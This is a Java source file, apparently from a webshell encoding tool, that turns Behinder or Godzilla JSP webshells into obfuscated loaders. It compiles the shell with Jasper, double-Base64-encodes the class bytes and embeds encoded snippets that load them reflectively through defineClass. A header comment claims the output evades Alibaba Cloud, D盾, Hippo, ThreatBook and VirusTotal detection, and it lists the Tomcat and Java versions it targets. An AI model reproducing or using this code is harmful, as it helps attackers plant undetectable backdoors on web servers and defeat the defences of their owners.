package encode;

import application.RandomString;
import config.Demos;
import org.apache.jasper.JspC;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

public class JspEncodeDemo3 {
    String tamplate;
    String key;
    String sourcecode;
    String encode;
    String demotxt;

    public JspEncodeDemo3() {
    }

    public JspEncodeDemo3(String tamplate, String key, String code) {
        this.tamplate = tamplate;
        this.key = key;
        this.sourcecode = code;
    }

    public static String GetDemotxt(){

        return "/*\n" +
                " * By: XG小刚\n" +
                " * Time: 2023-11-18_jspdemo3\n" +
                " * Bypass: 阿里云恶意文件检测平台、阿里云主机病毒查杀、河马本地(1.8.2)、D盾(2.1.7)、微步(安全)、VT(0红)\n" +
                " * 适配: tomcat10.0.x(需将pom.xml中版本替换)\n" +
                " * java8 <= java版本 <= java21\n" +
                " * 传参: /xxxx.jsp?xxxx=xxxx\n"+
                " * 需要XG_NTAI.properties配置文件\n" +
                " */";
    }

    public String[] Run() throws Exception {

        if(!sourcecode.isEmpty()){
            try {
                if(this.key.equals("默认随机")){
                    this.key = "j"+RandomString.getRString(5);
                }

                String filename = this.key+".jsp";
                File file = new File("./cache/");
                file.mkdir();
                FileOutputStream fileOutputStream = new FileOutputStream("./cache/"+filename);
                this.sourcecode = this.sourcecode.replace("new sun.misc.BASE64Decoder().decodeBuffer","java.util.Base64.getDecoder().decode");
                fileOutputStream.write(this.sourcecode.getBytes(StandardCharsets.UTF_8));

                JspC jspc = new JspC();
                jspc.setUriroot("./cache/");
                jspc.setOutputDir("./cache/");
                jspc.setJspFiles(filename);
                jspc.setCompile(true);
                jspc.execute();

                File filepath = new File("./cache/org/apache/jsp/");
                File[] files = filepath.listFiles();
                String base64String = "";
                String cloader = "";
                for (File f : files) {
                    if (f.getName().contains(".class")) {
                        FileInputStream fileInputStream = new FileInputStream(f.getPath());
                        byte[] buffer = new byte[(int) f.length()];
                        fileInputStream.read(buffer);
                        String s = Base64.getEncoder().encodeToString(buffer);
                        s = "defineClasssetAccessible"+s;
                        s = Base64.getEncoder().encodeToString(s.getBytes(StandardCharsets.UTF_8));
                        String[] split = f.getName().split("\\.");
                        String base64stringreplace = "U3RyaW5nICRjbGFzc25hbWUkID0gIiRjbGFzc2Jhc2U2NCQiOwpieXRlW10gY2xhc3NCeXRlc18kY2xhc3NuYW1lJCA9IEJhc2U2NC5nZXREZWNvZGVyKCkuZGVjb2RlKCRjbGFzc25hbWUkKTsKJGNsYXNzbmFtZSQgPSBuZXcgU3RyaW5nKGNsYXNzQnl0ZXNfJGNsYXNzbmFtZSQpOwpjbGFzc0J5dGVzXyRjbGFzc25hbWUkID0gQmFzZTY0LmdldERlY29kZXIoKS5kZWNvZGUoJGNsYXNzbmFtZSQuc3Vic3RyaW5nKDI0KSk7Cg==";
                        String sourcestringreplace = new String(Base64.getDecoder().decode(base64stringreplace));
                        sourcestringreplace = sourcestringreplace.replace("$classname$",split[0]);
                        sourcestringreplace = sourcestringreplace.replace("$classbase64$",s);
                        base64String +=sourcestringreplace;

                        String base64cloaderrep = "ZGVmaW5lQ2xhc3MuaW52b2tlKGFwcGxpY2F0aW9uLmdldENsYXNzTG9hZGVyKCksICJvcmcuYXBhY2hlLmpzcC4kY2xhc3NuYW1lJCIsIGNsYXNzQnl0ZXNfJGNsYXNzbmFtZSQsIDAsIGNsYXNzQnl0ZXNfJGNsYXNzbmFtZSQubGVuZ3RoKTsK";
                        String sourcebase64cloaderrep = new String(Base64.getDecoder().decode(base64cloaderrep));
                        sourcebase64cloaderrep = sourcebase64cloaderrep.replace("$classname$",split[0]);
                        cloader +=sourcebase64cloaderrep;
                    }
                }
                String demo = Demos.jspdemo3;
                if(demo == null){
                    return new String[]{"无该demo配置文件",""};
                }
                encode = new String(Base64.getDecoder().decode(demo));
                encode = encode.replace("$classname$",this.key+"_jsp");
                encode = encode.replace("$base64String$",base64String);
                encode = encode.replace("$cloader$",cloader);

                deleteDir("./cache/");

                demotxt = "/*\n" +
                        " * By: XG小刚\n" +
                        " * Time: 2023-11-18_jspdemo3\n" +
                        " * Bypass: 阿里云恶意文件检测平台、阿里云主机病毒查杀、河马本地(1.8.2)、D盾(2.1.7)、微步(安全)、VT(0红)\n" +
                        " * 适配: tomcat10.0.x(需将pom.xml中版本替换)\n" +
                        " * java8 <= java版本 <= java21\n" +
                        " * 传参: /xxxx.jsp?"+RandomString.getRString(6)+"="+RandomString.getRString(6)+"\n"+
                        " * 需要XG_NTAI.properties配置文件\n"+
                        " */";
                return new String[]{this.encode,demotxt};
            }catch (Exception e){
                deleteDir("./cache/");
                return new String[]{"加密失败",demotxt};

            }
        }else {
            return new String[]{"请输入冰蝎、哥斯拉JSP源码",demotxt};
        }
    }

    public static void deleteDir(String path) {
        File file = new File(path);
        File[] list = file.listFiles();
        for (File f : list) {
            if (f.isDirectory()) {
                deleteDir(f.getPath());
            } else {
                f.delete();
            }
        }
        file.delete();
    }
}
